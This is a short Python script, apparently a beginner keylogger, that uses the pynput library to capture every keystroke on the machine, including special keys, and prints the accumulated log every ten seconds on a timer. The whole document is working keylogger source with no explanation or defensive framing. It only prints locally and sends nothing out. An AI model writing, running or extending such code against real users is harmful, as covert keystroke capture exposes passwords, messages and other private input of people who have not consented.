#!/usr/bin/env python
import pynput.keyboard
import threading

log = ""
def use_keys(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " [" + str(key) + "] "
def report():
    global log
    print(log)
    log = ""
    timer = threading.Timer(10, report)
    timer.start()

key_rec = pynput.keyboard.Listener(on_press=use_keys)
with key_rec:
    report()
    key_rec.join()